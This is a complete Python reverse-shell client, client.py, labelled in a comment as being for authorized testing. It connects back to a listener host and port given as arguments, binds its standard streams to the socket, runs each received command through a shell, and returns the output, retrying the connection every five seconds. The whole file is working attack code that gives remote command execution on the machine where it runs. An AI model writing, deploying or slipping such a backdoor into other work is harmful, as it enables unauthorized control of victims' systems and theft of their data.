#!/usr/bin/env python3
# client.py - Run this on the TARGET machine (for authorized testing)

import socket
import subprocess
import os
import sys
import time

def connect_back(host, port):
    """Connect back to the listener and execute commands"""
    while True:
        try:
            # Create socket connection
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))
            
            # Redirect standard streams
            os.dup2(client.fileno(), 0)  # stdin
            os.dup2(client.fileno(), 1)  # stdout
            os.dup2(client.fileno(), 2)  # stderr
            
            # Send initial connection message
            client.send(b"[+] Connected to reverse shell\n")
            
            # Main command loop
            while True:
                # Receive command
                cmd = client.recv(4096).decode().strip()
                
                if not cmd or cmd.lower() == 'quit':
                    break
                
                # Execute command
                try:
                    if cmd.startswith('cd '):
                        # Handle directory change
                        os.chdir(cmd[3:].strip())
                        client.send(f"[+] Changed directory to {os.getcwd()}\n".encode())
                    else:
                        # Execute command and capture output
                        result = subprocess.run(
                            cmd,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                        
                        # Send output back
                        output = result.stdout + result.stderr
                        if not output:
                            output = "[+] Command executed (no output)\n"
                        
                        client.send(output.encode())
                        
                except subprocess.TimeoutExpired:
                    client.send(b"[-] Command timed out\n")
                except Exception as e:
                    client.send(f"[-] Error: {str(e)}\n".encode())
            
            client.close()
            break
            
        except ConnectionRefusedError:
            print("[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Connection error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 client.py <host> <port>")
        print("Example: python3 client.py 192.168.1.100 4444")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    print(f"[*] Connecting to {host}:{port}...")
    connect_back(host, port)